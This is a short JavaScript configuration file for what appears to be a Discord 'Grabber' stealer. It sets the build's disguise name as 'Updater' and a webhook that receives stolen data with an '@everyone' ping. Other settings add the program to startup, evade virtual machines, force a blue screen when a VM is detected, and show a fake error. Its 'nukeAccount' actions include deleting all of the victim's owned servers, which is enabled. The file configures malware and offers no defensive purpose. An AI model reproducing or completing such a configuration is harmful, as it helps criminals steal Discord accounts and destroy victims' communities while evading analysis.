/**
 * For configuration, see https://github.com/JustYuuto/Grabber/wiki/Configuration
 */
module.exports = {
  name: 'App Name',
  filename: 'Updater',
  webhook: {
    url: '<WEBHOOK_URL>',
    content: '@everyone',
  },
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  addToStartup: true,
  vmProtect: true,
  bsodIfVm: true,
  fakeError: true,
  discord: {
    uninstall: false,
    killProcess: false,
    nukeAccount: {
      removeAllFriends: false,
      leaveAllGuilds: false,
      deleteAllOwnedGuilds: true,
      sendMessageToAllDMs: false
    }
  }
};
